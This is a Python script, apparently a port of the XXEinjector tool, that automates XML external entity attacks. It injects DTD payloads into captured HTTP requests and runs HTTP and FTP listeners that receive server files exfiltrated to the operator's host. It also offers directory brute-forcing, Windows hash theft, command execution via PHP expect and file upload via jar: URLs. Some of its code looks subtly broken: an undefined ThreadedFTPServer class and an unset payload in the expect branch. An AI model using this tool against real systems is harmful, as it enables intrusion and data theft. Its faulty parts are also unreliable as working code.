#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "beautifulsoup4>=4.14.3",
#     "dulwich>=0.24.10",
#     "impacket>=0.13.0",
#     "minikerberos>=0.4.9",
#     "pituophis>=1.1",
#     "pyasn1>=0.4.8",
#     "pycryptodome>=3.9.0",
#     "pyftpdlib>=2.1.0",
#     "pysocks>=1.7.1",
#     "requests>=2.32.5",
#     "requests-pkcs12>=1.27",
# ]
# ///

import socket
import os
import sys
import urllib.parse
import base64
import threading
import time
import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from ftplib import FTP
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
import ssl
import re
import json
import urllib.request
import urllib.error
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

class XXEinjector:
    def __init__(self):
        self.config = {
            'host': '',
            'path': '',
            'file': '',
            'secfile': '',
            'enum': 'ftp',
            'logger': False,
            'proto': 'http',
            'proxy': '',
            'proxy_port': '',
            'enumports': '',
            'phpfilter': False,
            'enumall': False,
            'brute': '',
            'direct': '',
            'cdata': False,
            'hashes': False,
            'upload': '',
            'expect': '',
            'xslt': False,
            'test': False,
            'dtdi': True,
            'rproto': 'file',
            'output': 'brute.log',
            'verbose': False,
            'timeout': 10,
            'contimeout': 30,
            'port': 0,
            'remote': '',
            'http_port': 80,
            'ftp_port': 21,
            'gopher_port': 70,
            'jar_port': 1337,
            'xslt_port': 1337,
            'urlencode': False,
            'netdoc': False,
            'rhost': '',
            'rport': 0
        }
        
        self.response = ""
        self.regex = re.compile(r'^[$.\-_~ 0-9A-Za-z]+$')
        self.filenames = []
        self.nextpath = ""
        self.enumpath = ""
        self.tmppath = ""
        self.directpath = ""
        self.blacklist = []
        self.whitelist = []
        self.method = "POST"
        self.switch = 0
        self.i = 0
        self.request_timeout = 1
        self.done = 0
        self.cut = 0
        self.uri = ""
        self.headers = {}
        self.post = ""
        self.dtd = ""
        self.xsl = ""
        
        self.servers = {}
        self.threads = []

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description='XXEinjector - Automated XXE exploitation tool')
        
        # Mandatory arguments
        parser.add_argument('--host', help='Our IP address for reverse connections')
        parser.add_argument('--file', help='File containing valid HTTP request with XML')
        parser.add_argument('--path', help='Path to enumerate')
        parser.add_argument('--brute', help='File with paths to bruteforce')
        parser.add_argument('--logger', action='store_true', help='Log results only, do not send requests')
        
        # Remote host arguments
        parser.add_argument('--rhost', help='Remote host IP or domain')
        parser.add_argument('--rport', type=int, help='Remote host TCP port')
        
        # Exploitation methods
        parser.add_argument('--oob', choices=['http', 'ftp', 'gopher'], default='ftp', 
                          help='Out of Band exploitation method')
        parser.add_argument('--direct', help='Direct exploitation with unique mark')
        parser.add_argument('--cdata', action='store_true', help='Use CDATA for direct exploitation')
        parser.add_argument('--2ndfile', help='File for second order exploitation')
        parser.add_argument('--phpfilter', action='store_true', help='Use PHP filter to base64 encode')
        parser.add_argument('--netdoc', action='store_true', help='Use netdoc protocol instead of file')
        parser.add_argument('--enumports', help='Enumerate unfiltered ports')
        
        # Advanced exploitation
        parser.add_argument('--hashes', action='store_true', help='Steal Windows hashes')
        parser.add_argument('--expect', help='Execute system command using PHP expect')
        parser.add_argument('--upload', help='Upload file using Java jar schema')
        parser.add_argument('--xslt', action='store_true', help='Test for XSLT injection')
        
        # Connection options
        parser.add_argument('--ssl', action='store_true', help='Use SSL')
        parser.add_argument('--proxy', help='Proxy to use (host:port)')
        
        # Port configurations
        parser.add_argument('--httpport', type=int, default=80, help='HTTP port')
        parser.add_argument('--ftpport', type=int, default=21, help='FTP port')
        parser.add_argument('--gopherport', type=int, default=70, help='Gopher port')
        parser.add_argument('--jarport', type=int, default=1337, help='JAR upload port')
        parser.add_argument('--xsltport', type=int, default=1337, help='XSLT test port')
        
        # Operation modes
        parser.add_argument('--test', action='store_true', help='Test mode - show request only')
        parser.add_argument('--urlencode', action='store_true', help='URL encode injected DTD')
        parser.add_argument('--nodtd', action='store_true', help='Disable automatic DTD injection')
        parser.add_argument('--output', default='brute.log', help='Output file')
        parser.add_argument('--timeout', type=int, default=10, help='Timeout for receiving content')
        parser.add_argument('--contimeout', type=int, default=30, help='Timeout for closing connection')
        parser.add_argument('--fast', action='store_true', help='Skip asking what to enumerate')
        parser.add_argument('--verbose', action='store_true', help='Show verbose messages')
        
        # XML generation
        parser.add_argument('--oob-xml', action='store_true', help='Show sample OOB XML')
        parser.add_argument('--direct-xml', action='store_true', help='Show sample direct XML')
        parser.add_argument('--localdtd-xml', action='store_true', help='Show sample local DTD XML')
        parser.add_argument('--cdata-xml', action='store_true', help='Show sample CDATA XML')
        
        args = parser.parse_args()
        
        # Update configuration
        for key, value in vars(args).items():
            if value is not None:
                self.config[key] = value
        
        # Handle proxy
        if self.config['proxy']:
            parts = self.config['proxy'].split(':')
            if len(parts) == 2:
                self.config['proxy'] = parts[0]
                self.config['proxy_port'] = int(parts[1])
        
        # Handle direct parameter (comma separated start and end marks)
        if self.config['direct'] and ',' in self.config['direct']:
            self.direct_marks = self.config['direct'].split(',')
        else:
            self.direct_marks = [self.config['direct'], self.config['direct']]
        
        # Validate required arguments
        if not self.config['logger']:
            if not self.config['file']:
                print("Error: --file is required")
                sys.exit(1)
            if not self.config['host'] and not self.config['direct']:
                print("Error: Either --host or --direct is required")
                sys.exit(1)
        
        return args

    def show_banner(self):
        print("""
        ██╗  ██╗██╗  ██╗███████╗██╗███╗   ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
        ╚██╗██╔╝╚██╗██╔╝██╔════╝██║████╗  ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
         ╚███╔╝  ╚███╔╝ █████╗  ██║██╔██╗ ██║█████╗  ██║        ██║   ██║   ██║██████╔╝
         ██╔██╗  ██╔██╗ ██╔══╝  ██║██║╚██╗██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
        ██╔╝ ██╗██╔╝ ██╗██║     ██║██║ ╚████║███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
        ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
        
        XXEinjector - Automated XXE Exploitation Tool
        """)

    def show_sample_xml(self, xml_type):
        if xml_type == 'oob':
            print("\nSample OOB XML payload:")
            print(f'<!DOCTYPE m [ <!ENTITY % remote SYSTEM "http://{self.config["host"]}:{self.config["http_port"]}/file.dtd">%remote;%int;%trick;]>')
        
        elif xml_type == 'direct':
            print("\nSample direct exploitation XML:")
            print('<!DOCTYPE m [ <!ENTITY direct SYSTEM "XXEINJECT">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>')
        
        elif xml_type == 'localdtd':
            print("\nSample local DTD XML:")
            print('<!DOCTYPE m [ <!ENTITY % local_dtd SYSTEM "PUT_HERE_PATH_TO_LOCAL_DTD">')
            print('<!ENTITY % SuperClass \'><!ENTITY &#x25; file SYSTEM "XXEINJECT">')
            print('<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">')
            print('&#x25;eval;&#x25;error;\'>%local_dtd;]>')
        
        elif xml_type == 'cdata':
            print("\nSample CDATA XML:")
            print(f'<!DOCTYPE m [ <!ENTITY % a "<![CDATA["><!ENTITY % local SYSTEM "XXEINJECT">')
            print(f'<!ENTITY % remote SYSTEM "http://{self.config["host"]}:{self.config["http_port"]}/file.dtd">')
            print('<!ENTITY % z "]]>">%remote;]><tag>UNIQUEMARK&join;UNIQUEMARK</tag>')
        
        sys.exit(0)

    def configure_request(self):
        """Read and configure HTTP request from file"""
        try:
            with open(self.config['file'], 'r') as f:
                lines = f.readlines()
        except FileNotFoundError:
            print(f"[-] File not found: {self.config['file']}")
            sys.exit(1)
        
        # Parse request method and URI
        first_line = lines[0].strip().split()
        if len(first_line) < 2:
            print("[-] Invalid HTTP request format")
            sys.exit(1)
        
        self.method = first_line[0]
        self.uri = first_line[1]
        
        # Parse headers
        i = 1
        self.headers = {}
        while i < len(lines) and lines[i].strip():
            line = lines[i].strip()
            if not line.lower().startswith('host:'):
                if ': ' in line:
                    key, value = line.split(': ', 1)
                    self.headers[key] = value
            i += 1
        
        # Parse body
        i += 1  # Skip empty line
        self.post = ""
        while i < len(lines):
            self.post += lines[i]
            i += 1
        
        # Inject DTD if needed
        if self.config['dtdi'] and not self.config['test']:
            self.inject_dtd()
        
        # Update Content-Length
        if 'Content-Length' in self.headers:
            self.headers['Content-Length'] = str(len(self.post.encode('utf-8')))
    
    def inject_dtd(self):
        """Inject DTD into the request"""
        if self.config['xslt']:
            payload = self.xsl
        else:
            payload = self.dtd
        
        # Encode if needed
        if self.config['urlencode']:
            payload = urllib.parse.quote(payload)
        
        # Inject into URI
        if 'XXEINJECT' in self.uri:
            self.uri = self.uri.replace('XXEINJECT', payload)
        
        # Inject into headers
        for header, value in self.headers.items():
            if 'XXEINJECT' in value:
                self.headers[header] = value.replace('XXEINJECT', payload)
        
        # Inject into body
        if 'XXEINJECT' in self.post:
            self.post = self.post.replace('XXEINJECT', payload)
        
        # Handle XML declaration
        if '<?xml' in self.post and not self.config['direct']:
            self.post = self.post.replace('?>', '?>' + payload)
    
    def send_request(self):
        """Send HTTP request to target"""
        if self.config['test']:
            print("\n" + "="*50)
            print("TEST MODE - Request will not be sent")
            print("="*50)
            print(f"URL: {self.config['proto']}://{self.config['remote']}:{self.config['port']}{self.uri}")
            print(f"Method: {self.method}")
            print("\nHeaders:")
            for k, v in self.headers.items():
                print(f"  {k}: {v}")
            if self.post:
                print("\nBody:")
                print(self.post)
            print("="*50)
            sys.exit(0)
        
        if self.config['verbose']:
            print(f"[+] Sending {self.method} request to {self.config['remote']}:{self.config['port']}")
        
        try:
            # Build request
            if self.config['proto'] == 'https':
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
            
            # Create request
            url = f"{self.config['proto']}://{self.config['remote']}:{self.config['port']}{self.uri}"
            
            req = urllib.request.Request(url)
            req.method = self.method
            
            # Add headers
            for key, value in self.headers.items():
                req.add_header(key, value)
            
            # Add body for POST/PUT requests
            if self.method in ['POST', 'PUT']:
                req.data = self.post.encode('utf-8')
            
            # Handle proxy
            if self.config['proxy']:
                proxy_handler = urllib.request.ProxyHandler({
                    'http': f"http://{self.config['proxy']}:{self.config['proxy_port']}",
                    'https': f"https://{self.config['proxy']}:{self.config['proxy_port']}"
                })
                opener = urllib.request.build_opener(proxy_handler)
                urllib.request.install_opener(opener)
            
            # Send request
            with urllib.request.urlopen(req, timeout=self.config['timeout']) as response:
                self.response = response.read().decode('utf-8')
                
                if self.config['verbose']:
                    print(f"[+] Response status: {response.status}")
                    print(f"[+] Response headers: {dict(response.headers)}")
                
                return response.status, self.response
                
        except Exception as e:
            print(f"[-] Error sending request: {e}")
            return None, None
    
    def start_http_server(self):
        """Start HTTP server for OOB communication"""
        class XXEHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/file.dtd':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/xml')
                    self.end_headers()
                    
                    # Generate payload based on configuration
                    if self.server.xxe.config['cdata']:
                        payload = '<!ENTITY join "%a;%local;%z;">'
                    elif self.server.xxe.config['hashes']:
                        payload = f'<!ENTITY % payl "hashes">\n<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'{self.server.xxe.config["rproto"]}:////{self.server.xxe.config["host"]}/hash/hash.txt\'>">'
                    elif self.server.xxe.config['upload']:
                        payload = f'<!ENTITY % payl "upload">\n<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'jar:http://{self.server.xxe.config["host"]}:{self.server.xxe.config["jar_port"]}!/upload\'>">'
                    elif self.server.xxe.config['expect']:
                        # Expect payload
                        pass
                    else:
                        # Regular file enumeration payload
                        if self.server.xxe.config['phpfilter']:
                            payload = f'<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///{self.server.xxe.enumpath}">\n<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{self.server.xxe.config["host"]}:{self.server.xxe.config["http_port"]}/?p=%payl;\'>">'
                        else:
                            payload = f'<!ENTITY % payl SYSTEM "{self.server.xxe.config["rproto"]}:///{self.server.xxe.enumpath}">\n<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{self.server.xxe.config["host"]}:{self.server.xxe.config["http_port"]}/?p=%payl;\'>">'
                    
                    self.wfile.write(payload.encode('utf-8'))
                    
                elif '?p=' in self.path:
                    # Extract data from parameter
                    data = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('p', [''])[0]
                    
                    if self.server.xxe.config['phpfilter']:
                        try:
                            data = base64.b64decode(data).decode('utf-8')
                        except:
                            pass
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'Thanks')
                    
                    # Process received data
                    self.server.xxe.process_received_data(data)
                    
                else:
                    self.send_response(404)
                    self.end_headers()
        
        handler = type('Handler', (XXEHandler,), {})
        handler.server = self
        
        server = HTTPServer(('0.0.0.0', self.config['http_port']), handler)
        server.xxe = self
        
        print(f"[+] HTTP server started on port {self.config['http_port']}")
        
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        
        self.servers['http'] = server
        self.threads.append(thread)
    
    def start_ftp_server(self):
        """Start FTP server for OOB communication"""
        class XXEFTPHandler(FTPHandler):
            def ftp_RETR(self, file):
                # Process retrieved file content
                data = file.replace('RETR ', '').strip()
                
                if self.server.xxe.config['phpfilter']:
                    try:
                        data = base64.b64decode(data).decode('utf-8')
                    except:
                        pass
                
                self.server.xxe.process_received_data(data)
                return '226 Transfer complete'
        
        handler = type('Handler', (XXEFTPHandler,), {})
        handler.server = self
        
        server = ThreadedFTPServer(('0.0.0.0', self.config['ftp_port']), handler)
        server.xxe = self
        
        print(f"[+] FTP server started on port {self.config['ftp_port']}")
        
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        
        self.servers['ftp'] = server
        self.threads.append(thread)
    
    def process_received_data(self, data):
        """Process received data from OOB channel"""
        if self.config['expect']:
            print(f"[+] Command output:\n{data}")
            sys.exit(0)
        
        print("[+] Received data:")
        
        # Split by newlines
        lines = data.split('\n')
        
        for line in lines:
            line = line.strip()
            if line:
                print(f"  {line}")
                
                # Log to file
                self.log_data(line)
                
                # Check if it's a directory listing
                if self.regex.match(line):
                    self.filenames.append(line)
    
    def log_data(self, data):
        """Log data to output file"""
        output_path = Path(self.config['output'])
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        with open(output_path, 'a') as f:
            f.write(data + '\n')
        
        if self.config['verbose']:
            print(f"[+] Logged: {data}")
    
    def enumerate_directory(self):
        """Enumerate directory using discovered filenames"""
        print("\n" + "="*50)
        print("Directory Enumeration")
        print("="*50)
        
        while self.i < len(self.filenames):
            filename = self.filenames[self.i]
            
            # Ask user for action
            if not self.config['enumall']:
                full_path = os.path.join(self.config['path'], filename)
                print(f"\nEnumerate {full_path}?")
                print("Options: y=yes, n=no, a=all in dir, s=skip dir, q=quit")
                
                choice = input("> ").lower().strip()
                
                if choice == 'q':
                    sys.exit(0)
                elif choice == 's':
                    self.blacklist.append(os.path.dirname(full_path))
                    continue
                elif choice == 'a':
                    self.whitelist.append(os.path.dirname(full_path))
                    choice = 'y'
                elif choice not in ['y', '']:
                    continue
            
            # Update paths for next enumeration
            self.nextpath = filename
            if self.config['path'].endswith('/'):
                self.enumpath = self.config['path'] + filename
            else:
                self.enumpath = self.config['path'] + '/' + filename
            
            # Send request for next file
            print(f"[+] Enumerating: {self.enumpath}")
            
            if self.config['direct']:
                self.directpath = self.enumpath
                self.configure_request()
            
            status, response = self.send_request()
            
            if self.config['direct'] and response:
                self.extract_direct_data(response)
            
            self.i += 1
            
            # Wait for OOB response if using OOB
            if not self.config['direct']:
                time.sleep(self.config['timeout'])
        
        print("\n[+] Enumeration complete!")
    
    def extract_direct_data(self, response):
        """Extract data from direct exploitation response"""
        start_mark, end_mark = self.direct_marks
        
        if start_mark not in response:
            print(f"[-] Start mark '{start_mark}' not found in response")
            return
        
        if end_mark not in response:
            print(f"[-] End mark '{end_mark}' not found in response")
            return
        
        # Extract data between marks
        start_idx = response.find(start_mark) + len(start_mark)
        end_idx = response.find(end_mark)
        
        if start_idx >= end_idx:
            print("[-] No data found between marks")
            return
        
        data = response[start_idx:end_idx].strip()
        
        print("[+] Extracted data:")
        print(data)
        
        # Log data
        self.log_data(data)
        
        # Check for directory listing
        lines = data.split('\n')
        for line in lines:
            line = line.strip()
            if self.regex.match(line):
                self.filenames.append(line)
    
    def bruteforce_files(self):
        """Bruteforce files from wordlist"""
        if not os.path.exists(self.config['brute']):
            print(f"[-] Wordlist not found: {self.config['brute']}")
            sys.exit(1)
        
        print(f"\n[+] Starting bruteforce with wordlist: {self.config['brute']}")
        
        with open(self.config['brute'], 'r') as f:
            wordlist = [line.strip() for line in f if line.strip()]
        
        for word in wordlist:
            print(f"[+] Testing: {word}")
            
            if self.config['direct']:
                self.directpath = word
                self.configure_request()
            else:
                self.enumpath = word
            
            status, response = self.send_request()
            
            if response:
                if self.config['direct']:
                    self.extract_direct_data(response)
                else:
                    # For OOB, just note that request was sent
                    print(f"  Request sent for: {word}")
            
            time.sleep(self.config['timeout'])
    
    def run(self):
        """Main execution method"""
        self.show_banner()
        self.parse_arguments()
        
        # Handle sample XML display
        if self.config.get('oob_xml'):
            self.show_sample_xml('oob')
        elif self.config.get('direct_xml'):
            self.show_sample_xml('direct')
        elif self.config.get('localdtd_xml'):
            self.show_sample_xml('localdtd')
        elif self.config.get('cdata_xml'):
            self.show_sample_xml('cdata')
        
        # Initialize paths
        if self.config['path']:
            self.config['path'] = self.config['path'].lstrip('/')
            if self.config['path'].endswith('/'):
                self.config['path'] = self.config['path'][:-1]
        
        # Generate DTD and XSL
        self.dtd = f'<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://{self.config["host"]}:{self.config["http_port"]}/file.dtd">%remote;%int;%trick;]>'
        self.xsl = f'<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:variable name="cmd" select="document(\'http://{self.config["host"]}:{self.config["xslt_port"]}/success\')"/><xsl:value-of select="$cmd"/></xsl:template></xsl:stylesheet>'
        
        # Start servers if needed
        if self.config['oob'] == 'http' and not self.config['logger']:
            self.start_http_server()
        elif self.config['oob'] == 'ftp':
            self.start_ftp_server()
        
        # Parse request file
        if not self.config['logger']:
            self.configure_request()
            
            # Get remote host from request if not specified
            if not self.config['remote']:
                # Try to extract from Host header
                for line in open(self.config['file'], 'r'):
                    if line.lower().startswith('host:'):
                        host = line.split(': ')[1].strip()
                        if ':' in host:
                            self.config['remote'], port = host.split(':')
                            self.config['port'] = int(port)
                        else:
                            self.config['remote'] = host
                        break
            
            if not self.config['remote']:
                print("[-] Could not determine remote host")
                sys.exit(1)
            
            if self.config['port'] == 0:
                self.config['port'] = 443 if self.config['ssl'] else 80
        
        # Execute based on mode
        if self.config['logger']:
            print("[+] Running in logger mode")
            print("[+] Send requests to trigger XXE")
            input("Press Enter to exit...")
        
        elif self.config['brute']:
            self.bruteforce_files()
        
        elif self.config['path']:
            # Start with initial enumeration
            if self.config['direct']:
                self.directpath = self.config['path']
                self.configure_request()
            else:
                self.enumpath = self.config['path']
            
            print(f"[+] Starting enumeration of: {self.config['path']}")
            
            status, response = self.send_request()
            
            if self.config['direct'] and response:
                self.extract_direct_data(response)
            
            # Continue with discovered files
            if self.filenames:
                self.enumerate_directory()
            else:
                print("[-] No files discovered for enumeration")
        
        else:
            print("[-] No action specified. Use --path for enumeration or --brute for bruteforce")
            sys.exit(1)
        
        # Cleanup
        print("\n[+] Cleanup complete")
        for name, server in self.servers.items():
            server.shutdown()

def main():
    injector = XXEinjector()
    injector.run()

if __name__ == "__main__":
    main()
